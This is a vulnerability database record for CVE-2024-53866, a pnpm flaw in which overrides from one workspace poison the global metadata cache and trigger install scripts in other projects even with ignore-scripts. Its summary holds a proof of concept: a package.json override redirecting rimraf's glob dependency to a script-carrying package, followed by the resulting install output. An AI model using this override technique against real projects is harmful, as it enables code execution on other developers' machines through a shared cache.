vulnerability_id: VCID-7q5p-2zxm-afg3
aliases:
  - CVE-2024-53866
  - GHSA-vm32-9rqf-rh3r
summary: "pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion\n###\
  \ Summary\n\npnpm seems to mishandle overrides and global cache:\n1. Overrides from one workspace\
  \ leak into npm metadata saved in global cache\n2. npm metadata from global cache affects\
  \ other workspaces\n3. installs by default don't revalidate the data (including on first lockfile\
  \ generation)\n\nThis can make workspace A (even running with `ignore-scripts=true`) posion\
  \ global cache and execute scripts in workspace B\n\nUsers generally expect `ignore-scripts`\
  \ to be sufficient to prevent immediate code execution on install (e.g. when the tree is just\
  \ repacked/bundled without executing it).\n\nHere, that expectation is broken\n\n### Details\n\
  \nSee PoC.\n\nIn it, overrides from a single run of A get leaked into e.g. `~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json`\
  \ and persistently affect all other projects using the cache\n\n### PoC\n\nPostinstall code\
  \ used in PoC is benign and can be inspected in <https://www.npmjs.com/package/ponyhooves?activeTab=code>,\
  \ it's just a `console.log`\n\n1. Remove store and cache\n   On mac: `rm -rf ~/Library/Caches/pnpm\
  \ ~/Library/pnpm/store`\n   This step is not required in general, but we'll be using a popular\
  \ package for PoC that's likely cached\n2. Create `A/package.json`:\n   ```json\n   {\n  \
  \   \"name\": \"A\",\n     \"pnpm\": { \"overrides\": { \"rimraf>glob\": \"npm:ponyhooves@1\"\
  \ } },\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with\
  \ `pnpm i --ignore-scripts` (the flag is not required, but the point of the demo is to show\
  \ that it doesn't help)\n4. Create `B/package.json`:\n   ```json\n   {\n     \"name\": \"\
  B\",\n     \"dependencies\": { \"rimraf\": \"6.0.1\" }\n   }\n   ```\n   Install it with `pnpm\
  \ i`\n\nResult:\n```console\nPackages: +3\n+++\nProgress: resolved 3, reused 3, downloaded\
  \ 0, added 3, done\nnode_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall\
  \ script, done in 51ms\n\ndependencies:\n+ rimraf 6.0.1\n\nDone in 1.4s\n```\n\nAlso, that\
  \ code got leaked into another project and it's lockfile now! \n\n### Impact\n\nGlobal state\
  \ integrity is lost via operations that one would expect to be secure, enabling subsequently\
  \ running arbitrary code execution on installs\n\nAs a work-around, use separate cache and\
  \ store dirs in each workspace"
severities:
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10257'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10138'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10187'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10295'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10251'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10246'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10247'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10254'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10273'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.1033'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10349'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10362'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10176'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00037'
    scoring_system: epss
    scoring_elements: '0.10235'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10875'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10932'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.11287'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10788'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10843'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10939'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00043'
    scoring_system: epss
    scoring_elements: '0.10859'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24606'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24619'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24632'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24639'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24562'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24579'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24508'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24642'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24448'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.24593'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00135'
    scoring_system: epss
    scoring_elements: '0.30134'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00135'
    scoring_system: epss
    scoring_elements: '0.30106'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00135'
    scoring_system: epss
    scoring_elements: '0.30088'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00135'
    scoring_system: epss
    scoring_elements: '0.30065'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: '0.00155'
    scoring_system: epss
    scoring_elements: '0.23347'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-vm32-9rqf-rh3r
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/pnpm/pnpm
  - score: '5.8'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:H/SI:H/SA:H
    published_at: None
    url: https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2024-12-11T17:11:58Z/
    published_at: None
    url: https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743
  - score: MODERATE
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r
  - score: '5.8'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:H/SI:H/SA:H
    published_at: None
    url: https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:N/T:T/P:M/B:A/M:M/D:R/2024-12-11T17:11:58Z/
    published_at: None
    url: https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-53866
weaknesses:
  - CWE-426
  - CWE-937
  - CWE-1035
  - CWE-346
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-53866
    reference_type:
    reference_id:
  - url: https://github.com/pnpm/pnpm
    reference_type:
    reference_id:
  - url: https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743
    reference_type:
    reference_id:
  - url: https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-53866
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-vm32-9rqf-rh3r
    reference_type:
    reference_id: GHSA-vm32-9rqf-rh3r
